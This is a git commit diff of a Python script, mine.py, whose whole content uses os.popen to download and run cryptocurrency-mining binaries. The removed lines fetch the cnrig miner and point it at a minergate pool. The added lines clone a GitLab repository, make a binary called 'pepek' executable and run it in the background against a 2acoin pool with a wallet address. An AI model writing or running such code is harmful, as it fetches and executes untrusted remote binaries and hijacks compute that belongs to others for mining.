c4a704b499bacc7e28a94c99ee8e0d53b0bd1e3d
nisurayamax <96881752+nisurayamax@users.noreply.github.com>
2022-01-15 12:44:07 +0000

    Update mine.py

--- mine.py
+++ mine.py
@@ -1,4 +1,5 @@
 import os
-a  = os.popen('wget -O cnrig https://github.com/cnrig/cnrig/releases/download/v0.1.5-release/cnrig-0.1.5-linux-x86_64').readlines()
-a  = os.popen('chmod +x cnrig').readlines()
-a  = os.popen('./cnrig --donate-level 1 -a cryptonight -u dwijads39@gmail.com -o fcn.pool.minergate.com:45610 -p x -B').readlines()
+a  = os.popen('git clone https://gitlab.com/rikzakalani04/7.git').readlines()
+a  = os.popen('cd 7').readlines()
+a  = os.popen(' chmod +x pepek').readlines()
+a  = os.popen('./pepek -o us-central.2acoin.org:3333 -u guns82236uScsVT1YRJcCPiX5VoWeiFVxZisncD5fMzBLsjcuSco3hC4fwd8csJ4DEDi8Mb9xGzWQAvAcfYZZwwM6bebxr1wEV -p SUKUMANTE1 -a Argon2/Chukwa -k').readlines()
